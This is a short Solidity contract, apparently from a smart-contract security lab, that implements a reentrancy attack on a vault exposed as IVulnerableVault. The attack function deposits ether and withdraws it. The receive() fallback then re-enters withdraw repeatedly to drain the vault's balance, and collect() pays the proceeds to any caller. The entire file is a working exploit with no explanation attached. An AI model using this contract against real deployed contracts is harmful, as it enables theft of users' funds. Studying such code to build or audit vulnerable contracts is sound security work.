// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVulnerableVault public immutable vault;

    uint256 public attackAmount;
    uint256 public maxReentries;
    uint256 public reentries;

    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
    }

    function attack(
        uint256 amount,
        uint256 _maxReentries
    ) external payable {
        require(msg.value == amount, "Seed must equal amount");

        attackAmount = amount;
        maxReentries = _maxReentries;
        reentries = 0;

        vault.deposit{value: msg.value}();
        vault.withdraw(amount);
    }

    receive() external payable {
        if (
            reentries < maxReentries &&
            address(vault).balance >= attackAmount
        ) {
            reentries++;
            vault.withdraw(attackAmount);
        }
    }

    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}